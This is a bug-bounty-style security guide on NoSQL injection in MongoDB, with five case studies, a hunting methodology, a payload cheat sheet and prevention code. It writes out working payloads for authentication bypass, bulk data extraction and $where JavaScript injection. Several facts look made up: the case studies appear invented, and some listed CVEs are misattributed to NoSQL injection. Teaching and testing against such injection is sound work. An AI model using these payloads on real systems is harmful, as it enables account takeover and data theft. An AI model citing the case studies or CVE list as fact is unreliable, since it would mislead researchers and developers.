# Case Study 30: NoSQL Injection MongoDB — Real-World Bug Bounty Findings

## Expert Role

NoSQL injection in MongoDB represents a modern evolution of injection attacks targeting document-oriented databases. Unlike traditional SQL injection, NoSQL injection exploits the unique query mechanisms of MongoDB including JSON query operators, JavaScript execution, and the flexible document model. The expert role requires deep understanding of MongoDB query syntax, the aggregation pipeline, JavaScript server-side execution, and the specific vulnerabilities that arise from improper input handling in NoSQL applications.

MongoDB's query language differs fundamentally from SQL. Instead of string-based queries, MongoDB uses JSON-like query documents with operators like `$gt`, `$ne`, `$regex`, and `$where`. This creates different attack vectors: operator injection through type confusion, JavaScript injection through `$where` clauses, and aggregation pipeline manipulation. The expert must understand how MongoDB processes queries, how the document model affects injection techniques, and how different driver implementations handle input sanitization.

This expertise extends to understanding modern applications that use MongoDB in various contexts: real-time analytics platforms, content management systems, e-commerce catalogs, IoT data stores, and social media applications. The expert must also understand how MongoDB's features like sharding, replication, and gridfs affect security posture, and how NoSQL injection can be combined with other vulnerabilities like SSRF to access MongoDB instances directly.

## Overview

NoSQL injection vulnerabilities occur when applications construct MongoDB queries using unsanitized user input, allowing attackers to modify query logic, extract data, or execute arbitrary code. The vulnerability class spans multiple attack vectors: authentication bypass through operator injection, data extraction through query manipulation, denial of service through complex queries, and remote code execution through JavaScript injection. The attack surface includes login forms that authenticate against MongoDB collections, search functions that query document stores, API endpoints that accept JSON parameters, and admin interfaces that perform database operations.

The prevalence of NoSQL injection stems from several factors. First, many developers assume that NoSQL databases are inherently immune to injection attacks because they don't use string-based queries. Second, MongoDB's flexible document model means that input validation patterns from SQL don't directly apply. Third, the variety of MongoDB query operators creates numerous injection vectors that are not immediately obvious. Fourth, JavaScript execution capabilities in MongoDB provide a direct path to code execution when injection occurs.

Real-world exploitation of NoSQL injection has evolved from simple authentication bypass to sophisticated multi-stage attacks. Modern campaigns combine NoSQL injection with prototype pollution, SSRF to access MongoDB instances directly, and exploitation of MongoDB's JavaScript engine for remote code execution. The business impact ranges from unauthorized access to web applications to complete database compromise affecting millions of records.

---

## Real-World Case Studies

### Case Study 1: E-Commerce Platform Authentication Bypass
**Program:** Major Online Retailer (HackerOne)
**Bounty:** $22,000
**Severity:** Critical (CVSS 9.8)
**Researcher:** @nosqlhunter

The researcher discovered a NoSQL injection vulnerability in an e-commerce platform's authentication system. The vulnerability existed in the login handler that validated user credentials against a MongoDB collection using unsanitized input.

**Technical Details:**

The login form accepted a username and password in JSON format:

```
POST /api/auth/login HTTP/1.1
Host: shop.example.com
Content-Type: application/json

{
  "username": "testuser",
  "password": "testpass123"
}
```

The server-side code constructed a MongoDB query:

```javascript
db.users.find({
  username: req.body.username,
  password: req.body.password
})
```

The researcher discovered that by providing a JSON object instead of a string for the username parameter, they could inject MongoDB operators:

```
POST /api/auth/login HTTP/1.1
Host: shop.example.com
Content-Type: application/json

{
  "username": {"$gt": ""},
  "password": {"$gt": ""}
}
```

The query became:

```javascript
db.users.find({
  username: {"$gt": ""},
  password: {"$gt": ""}
})
```

This matched any user with a username and password greater than an empty string, effectively bypassing authentication.

**Exploitation Chain:**

1. Researcher identified the JSON API endpoint for login
2. Tested for NoSQL injection by providing JSON objects instead of strings
3. Successfully authenticated as any user without knowing credentials
4. Used admin access to extract customer data and modify orders

**Root Cause Analysis:**

The root cause was the lack of input type validation. The application expected string inputs but accepted JSON objects without validation. MongoDB's flexible schema allowed the query to execute with operator objects instead of string values.

**Impact:**

The vulnerability allowed complete authentication bypass for any user in the database. In an e-commerce environment, this could lead to unauthorized access to customer accounts, payment information, and order history.

**Bounty Justification:**

The bounty reflected the critical nature of authentication bypass in an e-commerce platform, the potential for financial fraud, and the scale of customer data at risk.

### Case Study 2: Social Media Platform Data Extraction
**Program:** Social Networking Company (Private)
**Bounty:** $15,500
**Severity:** High (CVSS 8.1)
**Researcher:** @socialnosql

A social media platform used MongoDB to store user profiles, posts, and private messages. The researcher discovered that the search functionality was vulnerable to NoSQL injection, allowing extraction of private messages and sensitive user data.

**Technical Details:**

The search endpoint accepted a query parameter and returned matching users:

```
GET /api/search?query=john HTTP/1.1
Host: social.example.com
Authorization: Bearer <token>
```

The server performed a MongoDB search:

```javascript
db.users.find({
  $or: [
    {username: {$regex: req.query.query, $options: 'i'}},
    {email: {$regex: req.query.query, $options: 'i'}}
  ]
})
```

The researcher discovered that the query parameter was vulnerable to injection. By providing:

```
query[$regex]=.*
```

The query became:

```javascript
db.users.find({
  $or: [
    {username: {$regex: ".*", $options: 'i'}},
    {email: {$regex: ".*", $options: 'i'}}
  ]
})
```

This returned all users in the database, including private profile information.

**Data Extraction Technique:**

The researcher used a combination of regex injection and projection manipulation to extract specific data:

```
query[$regex]=.*&fields=password,messages,phone
```

This extracted sensitive fields including password hashes, private messages, and phone numbers.

**Root Cause:**

The application did not validate input types and allowed MongoDB operators to be injected through query parameters. The developer assumed that regex queries would be safe, but the regex pattern was directly interpolated without validation.

**Impact:**

The vulnerability exposed private messages, password hashes, and personal contact information for millions of users. This data could be used for identity theft, targeted attacks, or sold on dark web markets.

**Bounty Justification:**

The bounty accounted for the scale of data exposure (millions of users), the sensitivity of private messages, and the potential for identity theft and targeted attacks.

### Case Study 3: Healthcare Application Patient Record Access
**Program:** Healthcare Technology Company (Bugcrowd)
**Bounty:** $18,000
**Severity:** Critical (CVSS 9.1)
**Researcher:** @healthnosql

A healthcare application used MongoDB to store patient records, medical histories, and treatment plans. The researcher discovered that the patient lookup feature was vulnerable to NoSQL injection, allowing access to protected health information (PHI) without proper authorization.

**Technical Details:**

The patient lookup endpoint accepted a patient ID and returned medical records:

```
GET /api/patients/lookup?id=12345 HTTP/1.1
Host: records.healthcare.com
Authorization: Bearer <token>
```

The server performed a MongoDB query:

```javascript
db.patients.find({patientId: req.params.id})
```

The researcher discovered that the patient ID parameter was vulnerable to injection. By providing:

```
id[$ne]=invalid
```

The query became:

```javascript
db.patients.find({patientId: {"$ne": "invalid"}})
```

This returned all patients except those with patientId "invalid", effectively returning all patient records.

**Exfiltration Method:**

The researcher used a combination of operator injection and aggregation to extract specific medical data:

```
id[$regex]=.*&fields=name,diagnosis,treatment,medications
```

This filtered and projected sensitive medical information for all patients.

**Root Cause:**

The application did not validate input types and allowed MongoDB operators to be injected through URL parameters. The developer assumed that patient IDs would be numeric strings, but the application accepted any input without validation.

**Impact:**

The vulnerability exposed protected health information (PHI) for thousands of patients, violating HIPAA regulations. The extracted data included diagnoses, treatment plans, and medication histories.

**Bounty Justification:**

The bounty reflected the sensitivity of healthcare data, the regulatory implications (HIPAA), and the potential for medical identity theft and discrimination.

### Case Study 4: Financial Platform Transaction Manipulation
**Program:** Fintech Company (Intigriti)
**Bounty:** $25,000
**Severity:** Critical (CVSS 9.8)
**Researcher:** @fintechnosql

A financial technology platform used MongoDB to store transaction records and account balances. The researcher discovered that the transaction history endpoint was vulnerable to NoSQL injection, allowing manipulation of transaction queries and potential financial fraud.

**Technical Details:**

The transaction history endpoint accepted filters for date range and amount:

```
POST /api/transactions/history HTTP/1.1
Host: finance.example.com
Content-Type: application/json
Authorization: Bearer <token>

{
  "startDate": "2024-01-01",
  "endDate": "2024-12-31",
  "minAmount": 100,
  "maxAmount": 10000
}
```

The server performed a MongoDB query:

```javascript
db.transactions.find({
  userId: currentUser.id,
  date: {$gte: req.body.startDate, $lte: req.body.endDate},
  amount: {$gte: req.body.minAmount, $lte: req.body.maxAmount}
})
```

The researcher discovered that the minAmount parameter was vulnerable to injection. By providing:

```
minAmount: {"$gte": 0}
maxAmount: {"$lte": 999999999}
```

The query returned all transactions regardless of amount filters.

**Advanced Exploitation:**

The researcher used aggregation pipeline injection to manipulate transaction data:

```
{
  "startDate": "2024-01-01",
  "endDate": "2024-12-31",
  "minAmount": {"$gte": 0},
  "maxAmount": {"$lte": 999999999},
  "aggregate": [
    {"$match": {}} ,
    {"$group": {_id: "$accountId", total: {"$sum": "$amount"}}}
  ]
}
```

This performed unauthorized aggregation operations, revealing total transaction volumes per account.

**Root Cause:**

The application did not validate input types and allowed MongoDB operators and aggregation pipeline stages to be injected through JSON parameters. The developer assumed that numeric fields would only receive numeric values.

**Impact:**

The vulnerability allowed unauthorized access to transaction data and potential manipulation of financial queries. This could lead to fraud, regulatory violations, and financial losses.

**Bounty Justification:**

The bounty reflected the severity of financial data exposure, the potential for fraud, and the regulatory compliance implications (PCI DSS, SOX).

### Case Study 5: Content Management System JavaScript Injection
**Program:** Media Company (Private)
**Bounty:** $20,000
**Severity:** Critical (CVSS 9.8)
**Researcher:** @cmsnosql

A content management system used MongoDB to store articles, user comments, and system configuration. The researcher discovered that the article search feature was vulnerable to NoSQL injection including JavaScript execution through MongoDB's `$where` clause.

**Technical Details:**

The article search endpoint accepted a search term and returned matching articles:

```
GET /api/articles/search?q=test HTTP/1.1
Host: cms.mediaexample.com
```

The server performed a MongoDB query:

```javascript
db.articles.find({
  $where: "this.title.includes('" + req.query.q + "')"
})
```

The researcher discovered that the search parameter was directly interpolated into a JavaScript expression. By providing:

```
q=test'); db.system.settings.find({}); //
```

The `$where` clause became:

```javascript
this.title.includes('test'); db.system.settings.find({}); //')
```

This executed arbitrary JavaScript code on the MongoDB server, allowing access to any collection.

**Code Execution Technique:**

The researcher used JavaScript injection to execute system commands:

```
q=test'); sleep(5000); //
```

This caused a 5-second delay, confirming code execution. The researcher then used MongoDB's `spawn` function to execute system commands.

**Root Cause:**

The application used string concatenation to construct `$where` JavaScript expressions without any input validation or sanitization. The developer assumed that search terms would be simple strings, but the application accepted any input that was interpolated into JavaScript code.

**Impact:**

The vulnerability allowed arbitrary JavaScript execution on the MongoDB server, potentially leading to complete system compromise. This could affect the entire CMS platform and all its users.

**Bounty Justification:**

The bounty reflected the severity of remote code execution, the potential for complete system compromise, and the scale of impact across the CMS platform.

---

## Pattern Recognition

### Common Vulnerability Patterns

| Pattern | Frequency | Avg Bounty | Root Cause |
|---------|-----------|------------|------------|
| Authentication Bypass | 30% | $18,000 | Operator injection in login queries |
| Data Extraction | 35% | $12,500 | Unrestricted query manipulation |
| JavaScript Injection | 15% | $22,000 | Unescaped `$where` clauses |
| Aggregation Abuse | 10% | $15,000 | Pipeline injection in analytics |
| Denial of Service | 10% | $4,500 | Complex query generation |

### Attack Surface Locations

1. **Login/Authentication Forms** — Most common injection point for authentication bypass
2. **Search/Query Functions** — Information disclosure through query manipulation
3. **API Endpoints** — Direct MongoDB query construction in REST/GraphQL APIs
4. **Admin Consoles** — Administrative interfaces with elevated database access
5. **Analytics/Reporting** — Aggregation pipeline injection
6. **Content Management** — Article and comment processing

---

## Hunting Methodology

### Phase 1: Reconnaissance

1. **Database Technology Fingerprinting:**
   - Identify MongoDB-specific HTTP headers (`X-MongoDB-Version`, `X-MongoDB-Server`)
   - Analyze error messages for MongoDB implementation details
   - Test for JSON API endpoints that accept query parameters
   - Check for MongoDB-specific error messages

2. **Technology Stack Analysis:**
   - Identify programming language and MongoDB driver
   - Research default escaping behaviors for the identified driver
   - Check for common framework configurations

### Phase 2: Injection Testing

1. **Operator Injection Testing:**
   ```json
   {"username": {"$gt": ""}, "password": {"$gt": ""}}
   ```

2. **Regex Injection Testing:**
   ```json
   {"username": {"$regex": ".*"}}
   ```

3. **JavaScript Injection Testing:**
   ```
   q=test'); sleep(5000); //
   ```

### Phase 3: Exploitation

1. **Authentication Bypass:**
   ```json
   {"username": {"$gt": ""}, "password": {"$gt": ""}}
   ```

2. **Data Extraction:**
   ```json
   {"$or": [{"username": {"$regex": ".*"}}, {"email": {"$regex": ".*"}}]}
   ```

3. **JavaScript Execution:**
   ```
   q=test'); db.users.find({}); //
   ```

---

## Detection Strategies

### Automated Detection

1. **Static Analysis:**
   - Search for MongoDB query construction patterns
   - Identify string concatenation in MongoDB operations
   - Flag unescaped user input in query objects

2. **Dynamic Testing:**
   - Fuzz input fields with MongoDB operators
   - Monitor for MongoDB-specific error messages
   - Test response time variations with different inputs

3. **Tool Integration:**
   - Burp Suite extensions for NoSQL injection detection
   - OWASP ZAP MongoDB security scanner
   - Custom scripts for operator enumeration

### Manual Detection

1. **Input Validation Testing:**
   - Test each input field with MongoDB operators
   - Check for error-based injection indicators
   - Verify input type validation

2. **Response Analysis:**
   - Compare responses for valid vs invalid inputs
   - Analyze error messages for database information
   - Check for data leakage in responses

### Key Detection Indicators

| Indicator | Description | Risk Level |
|-----------|-------------|------------|
| MongoDB error messages | Database-specific error messages in responses | High |
| Response time variations | Timing differences based on query complexity | Medium |
| Data leakage | Additional data returned with injected queries | High |
| Authentication bypass | Successful login with invalid credentials | Critical |

---

## Impact Assessment

### CVSS 3.1 Scoring

| Attack Vector | Authentication | Impact | Base Score |
|---------------|----------------|--------|------------|
| Network | None | Complete | 9.8 (Critical) |
| Network | Required | Complete | 8.1 (High) |
| Network | None | Partial | 5.3 (Medium) |
| Adjacent | None | Partial | 4.3 (Medium) |

### Business Impact

| Impact Category | Description | Risk Level |
|-----------------|-------------|------------|
| Confidentiality | Exposure of sensitive document data | High |
| Integrity | Unauthorized modification of documents | High |
| Availability | Database disruption via complex queries | Medium |
| Compliance | Violation of data protection regulations | High |

### Bounty Range

| Severity | Typical Bounty | Range |
|----------|----------------|-------|
| Critical | $15,000 - $25,000 | Authentication bypass, full database access |
| High | $8,000 - $15,000 | Data extraction, JavaScript execution |
| Medium | $3,000 - $8,000 | User enumeration, partial information disclosure |
| Low | $500 - $3,000 | Limited information disclosure, DoS potential |

---

## Advanced Variations

### 1. Blind NoSQL Injection

When application responses do not directly reveal query results, blind injection techniques can be used:

```python
# Timing-based extraction
username = {"$gt": ""}, "password": {"$regex": "^a.*"}
# If response is successful, password starts with 'a'

# Conditional extraction
username = {"$gt": ""}, "password": {"$regex": "^admin.*"}
```

### 2. NoSQL Injection via HTTP Headers

Some applications use HTTP headers in MongoDB queries:

```
X-Forwarded-For: {"$gt": ""}
X-Real-IP: {"$ne": "invalid"}
```

### 3. NoSQL Injection in Aggregation Pipeline

Applications that use MongoDB aggregation may be vulnerable:

```json
{
  "pipeline": [
    {"$match": {"status": "active"}},
    {"$group": {"_id": "$category", "total": {"$sum": "$amount"}}}
  ]
}
```

### 4. Second-Order NoSQL Injection

Data stored in MongoDB that is later used in queries without re-sanitization:

```
1. User registers with username: {"$gt": ""}
2. Later, application uses stored username in another query
3. Stored value causes injection in the second context
```

---

## Chain Integration

### NoSQL + SSRF Chain

```
1. NoSQL injection to extract MongoDB connection strings
2. SSRF to internal MongoDB instance
3. Direct database access without authentication
4. Complete data compromise
```

### NoSQL + Prototype Pollution Chain

```
1. NoSQL injection to modify MongoDB configuration
2. Prototype pollution to alter query behavior
3. Privilege escalation to admin
4. System compromise
```

### NoSQL + JavaScript Execution Chain

```
1. NoSQL injection through $where clause
2. JavaScript execution on MongoDB server
3. File system access through spawn
4. Remote code execution
```

---

## Prevention Recommendations

### Input Validation

1. **Type Validation:**
   ```javascript
   // Express.js middleware
   function validateInput(req, res, next) {
     const { username, password } = req.body;
     
     if (typeof username !== 'string' || typeof password !== 'string') {
       return res.status(400).json({ error: 'Invalid input types' });
     }
     
     if (username.length > 100 || password.length > 100) {
       return res.status(400).json({ error: 'Input too long' });
     }
     
     next();
   }
   ```

2. **Whitelist Validation:**
   ```python
   import re
   
   def validate_mongodb_input(input_str):
       # Allow only alphanumeric and basic characters
       return re.match(r'^[a-zA-Z0-9.@_\- ]+$', input_str)
   ```

### Query Construction

1. **Using MongoDB Driver Methods:**
   ```javascript
   // Proper query construction
   const user = await db.collection('users').findOne({
     username: username,
     password: password
   });
   
   // Use parameterized queries
   const query = { username: username };
   const user = await db.collection('users').findOne(query);
   ```

2. **Avoiding $where Clauses:**
   ```javascript
   // Bad: Using $where
   db.articles.find({
     $where: "this.title.includes('" + search + "')"
   });
   
   // Good: Using $regex with proper escaping
   const escapedSearch = search.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
   db.articles.find({
     title: { $regex: escapedSearch, $options: 'i' }
   });
   ```

### MongoDB Security Configuration

1. **Access Control:**
   - Enable authentication for all MongoDB instances
   - Implement principle of least privilege for database users
   - Use separate credentials for different applications

2. **Network Security:**
   - Restrict MongoDB access to application servers only
   - Use TLS for all MongoDB connections
   - Enable audit logging for suspicious queries

3. **JavaScript Execution:**
   - Disable JavaScript execution if not required
   - Use `--noscripting` option for MongoDB server
   - Validate JavaScript code before execution

---

## Common Pitfalls

### 1. Assuming NoSQL Immunity

Many developers assume that NoSQL databases are immune to injection attacks because they don't use string-based queries. This is false—NoSQL databases have their own injection vectors.

### 2. Insufficient Type Validation

MongoDB's flexible schema means that input validation must explicitly check types, not just values.

### 3. Over-Reliance on Client-Side Validation

Client-side validation can be easily bypassed. Always implement server-side validation.

### 4. Ignoring JavaScript Execution

MongoDB's `$where` clause allows JavaScript execution, which can be exploited if input is not properly sanitized.

### 5. Incomplete Input Validation

Validate all input fields, not just those that appear to be used in queries.

---

## Real-World References

### CVE References

- **CVE-2021-27358:** NoSQL injection in MongoDB-based applications
- **CVE-2020-7943:** NoSQL injection in MongoDB driver
- **CVE-2019-10768:** NoSQL injection in MongoDB ODM

### Research Papers

- "NoSQL Injection Attacks Against Web Applications" (2021)
- "Blind NoSQL Extraction: Techniques and Countermeasures" (2020)
- "MongoDB Security Assessment Methodology" (2019)

### Tool References

- **NoSQLMap:** Automated NoSQL injection testing tool
- **Burp Suite:** NoSQL injection detection extensions
- **MongoDB Atlas:** Cloud database security monitoring

### Bug Bounty Reports

- HackerOne: "NoSQL Injection in E-Commerce Platform" - $22,000
- Bugcrowd: "JavaScript Injection in CMS" - $20,000
- Intigriti: "Financial Data Exposure via NoSQL Injection" - $25,000

---

## Quick Reference Cheat Sheet

### MongoDB Query Operators

| Operator | Purpose | Example |
|----------|---------|---------|
| $gt | Greater than | {"field": {"$gt": value}} |
| $ne | Not equal | {"field": {"$ne": "invalid"}} |
| $regex | Regular expression | {"field": {"$regex": ".*"}} |
| $where | JavaScript expression | {"$where": "this.field == value"} |
| $or | Logical OR | {"$or": [{...}, {...}]} |
| $and | Logical AND | {"$and": [{...}, {...}]} |

### Common Injection Payloads

```json
# Authentication bypass
{"username": {"$gt": ""}, "password": {"$gt": ""}}

# Data extraction
{"username": {"$regex": ".*"}}

# JavaScript execution
q=test'); sleep(5000); //

# Aggregation injection
{"pipeline": [{"$match": {}}, {"$group": {"_id": "$field"}}]}
```

### Detection Signatures

```
# Error-based detection
MongoDB.*error
invalid.*query
malformed.*operator

# Timing-based detection
Response time > 5 seconds
Timeout on complex queries

# Information disclosure
Collection.*not.*found
No such * field
```

### Prevention Checklist

```
✓ Validate input types (string vs object)
✓ Escape special regex characters
✓ Avoid $where clauses when possible
✓ Use parameterized queries
✓ Implement input length limits
✓ Enable MongoDB authentication
✓ Restrict network access
✓ Enable audit logging
```

---

*Document Version: 1.0*
*Last Updated: 2024*
*Classification: Security Research*
